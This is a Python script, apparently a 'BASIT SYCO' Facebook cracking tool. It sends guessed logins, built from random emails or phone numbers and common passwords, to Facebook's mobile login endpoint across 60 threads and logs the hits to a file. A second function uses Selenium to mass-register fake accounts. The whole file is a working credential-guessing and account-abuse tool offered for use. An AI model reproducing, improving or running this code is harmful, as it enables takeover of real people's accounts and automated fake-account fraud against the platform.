import os, sys, time, random, string, re
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    os.system('pip install requests selenium webdriver-manager')
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- COLORS ---
G = '\033[1;92m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
B = '\033[1;94m' # Blue
Y = '\033[1;93m' # Yellow

# --- LOGIN SYSTEM ---
def login():
    os.system('clear')
    print(f"{G}====================================")
    print(f"{Y}      BASIT SYCO SUPREME FINAL")
    print(f"{G}====================================")
    u = input(f"{W}[+] Username: ")
    p = input(f"{W}[+] Password: ")
    if u == "basitsultan" and p == "basitprince":
        menu()
    else:
        print(f"{R}Wrong Details!"); time.sleep(1); login()

# --- REAL CRACKING ENGINE ---
def crack_engine(user, p_list):
    for pas in p_list:
        try:
            session = requests.Session()
            # Professional User-Agent for Real Login
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            head = {'User-Agent': ua, 'Accept-Language': 'en-US,en;q=0.9'}
            # Real FB Login API Point
            res = session.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pas}, headers=head, allow_redirects=False)
            
            if "c_user" in session.cookies.get_dict():
                print(f"\r{G}[SUCCESS] {user} | {pas} {W}")
                with open('ok.txt', 'a') as f: f.write(f"{user}|{pas}\n")
                return
            elif "checkpoint" in session.cookies.get_dict():
                print(f"\r{Y}[CP-ID] {user} | {pas} {W}")
                return
        except: pass
    print(f"\r{R}[FAILED] {user} | {pas} {W}", end="")

# --- GLOBAL RANDOM CLONER ---
def global_cloner():
    os.system('clear')
    print(f"{G}--- UNIVERSAL GLOBAL CLONING (LIVE) ---")
    limit = int(input(f"{W}[+] Total IDs to Target (e.g. 10000): "))
    
    targets = []
    # Mixing Numbers and Emails for Universal Attack
    for _ in range(limit):
        # 50% chance for email, 50% for number
        if random.choice([True, False]):
            user = "".join(random.choices(string.ascii_lowercase, k=6)) + str(random.randint(100, 9999)) + random.choice(["@gmail.com", "@yahoo.com"])
        else:
            user = "03" + "".join(random.choices("0123456789", k=9))
        targets.append(user)

    print(f"\n{B}[*] Cracking Started... Look for Green Results!\n")
    with ThreadPool(max_workers=60) as pool:
        for user in targets:
            # Universal Password List (Global)
            p_list = ["123456", "12345678", "pakistan", "786786", "khan123", "i love you", "password"]
            pool.submit(crack_engine, user, p_list)
    input(f"\n{G}[!] Task Done. Press Enter...")

# --- REAL ID CREATION (PC ONLY) ---
def auto_creation():
    os.system('clear')
    print(f"{G}--- REAL ACCOUNT CREATOR (PC VERSION) ---")
    total = int(input(f"{W}[+] How many IDs to create?: "))
    f_pass = input(f"{W}[+] Set Password: ")
    
    try:
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless') # Uncomment for invisible mode
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        
        for i in range(total):
            f_name = "".join(random.choices(string.ascii_uppercase, k=1)) + "".join(random.choices(string.ascii_lowercase, k=5))
            l_name = "Khan"
            email = f_name.lower() + str(random.randint(1000, 9999)) + "@mail7.io"
            
            driver.get("https://m.facebook.com/reg/")
            time.sleep(4)
            driver.find_element(By.NAME, "firstname").send_keys(f_name)
            driver.find_element(By.NAME, "lastname").send_keys(l_name)
            driver.find_element(By.NAME, "reg_email__").send_keys(email)
            driver.find_element(By.NAME, "reg_passwd__").send_keys(f_pass)
            
            print(f"{G}[CREATED] {f_name} {l_name} | {email} | {f_pass}")
            with open('created_ids.txt', 'a') as f: f.write(f"{email}|{f_pass}\n")
            time.sleep(15) # Wait for FB to process
            
        driver.quit()
    except Exception as e:
        print(f"{R}[!] Error: Run this on PC with Chrome installed! {e}")

def menu():
    os.system('clear')
    print(f"""{G}
  ____                 _   _     ____                    
 | __ )  __ _ ___ _ __| |_| |__ / ___| _   _  ___ ___  
 |  _ \ / _` / __| '__| __| '_ \\\\___ \\| | | |/ __/ _ \\ 
 | |_) | (_| \__ \ |  | |_| | | |___) | |_| | (_| (_) |
 |____/ \__,_|___/_|   \__|_| |_|____/ \__, |\___\___/ 
                                       |___/ {W}""")
    print(f"[1] Start Universal Cloning (Live Red/Green)")
    print(f"[2] Start Real ID Creation (PC Required)")
    print(f"[0] Exit")
    ch = input(f"\n{B}Select: ")
    if ch == '1': global_cloner()
    elif ch == '2': auto_creation()
    else: sys.exit()

if __name__ == "__main__":
    login()
